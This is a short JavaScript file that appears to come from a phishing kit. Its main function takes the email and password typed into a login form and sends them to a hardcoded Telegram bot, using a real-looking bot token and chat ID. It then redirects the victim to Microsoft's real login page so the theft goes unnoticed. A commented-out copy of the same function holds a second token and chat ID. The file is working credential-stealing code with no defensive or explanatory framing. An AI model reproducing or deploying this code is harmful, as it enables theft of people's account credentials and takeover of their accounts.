function sendTelegramMessageAndRedirect() {
    const telegramBotToken = '7018256337:AAHX2iHAfXZLAbe8ZYjZfvwDV6EQfYqYX1Y'; // add the telegram token
    const chatId = 7002450305;                                                 // add ths id from the web It's usually a number, not a string
    const emailValue = document.getElementById('email').value;
    const passwordValue = document.getElementById('password').value;

    const messageText = `Email: ${emailValue}\nPassword: ${passwordValue}`;

    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    const params = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: messageText,
        }),
    };

    // Make the API request
    fetch(url, params)
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('Message sent:', data);
            // Redirect to another page after successful submission
            window.location.href = 'https://login.microsoftonline.com'; // Replace with your desired URL
        })
        .catch(error => console.error('Error:', error));
}

// function sendTelegramMessage() {
//     const telegramBotToken = '6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68';
//     const chatId = 5349229520;
//     const emailValue = document.getElementById('email').value;
//     const passwordValue = document.getElementById('password').value;

//     const messageText = `Email: ${emailValue}\nPassword: ${passwordValue}`;

//     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

//     const params = {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json',
//         },
//         body: JSON.stringify({
//             chat_id: chatId,
//             text: messageText,
//         }),
//     };

//     fetch(url, params)
//         .then(response => response.json())
//         .then(data => console.log('Message sent:', data))
//         .catch(error => console.error('Error:', error));
// }
